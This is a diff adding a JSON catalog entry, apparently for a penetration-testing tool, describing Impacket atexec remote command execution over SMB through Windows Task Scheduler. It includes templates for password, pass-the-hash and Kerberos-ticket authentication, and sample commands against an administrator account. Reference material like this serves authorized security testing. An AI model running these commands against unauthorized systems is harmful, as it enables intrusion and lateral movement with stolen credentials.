@@ -1,0 +1,36 @@
+{
+  "id": "atexec",
+  "name": "Impacket AtExec",
+  "command": "impacket-atexec '<domain>/<user>:<password>@<ip>' 'whoami'",
+  "description": "Execute commands via Windows Task Scheduler service",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "impacket",
+    "atexec",
+    "task-scheduler",
+    "shell",
+    "execution"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "impacket-atexec -hashes ':<hash>' '<domain>/<user>@<ip>' 'whoami'"
+    },
+    {
+      "label": "Kerberos Ticket",
+      "requires": "ticket",
+      "command": "impacket-atexec -k -no-pass '<domain>/<user>@<ip>' 'whoami'"
+    }
+  ],
+  "examples": [
+    "impacket-atexec 'CORP/administrator:password@192.168.1.100' 'whoami'",
+    "impacket-atexec -hashes ':e19ccf75ee54e06b06a5907af13cef42' 'CORP/administrator@192.168.1.100' 'whoami'"
+  ]
+}
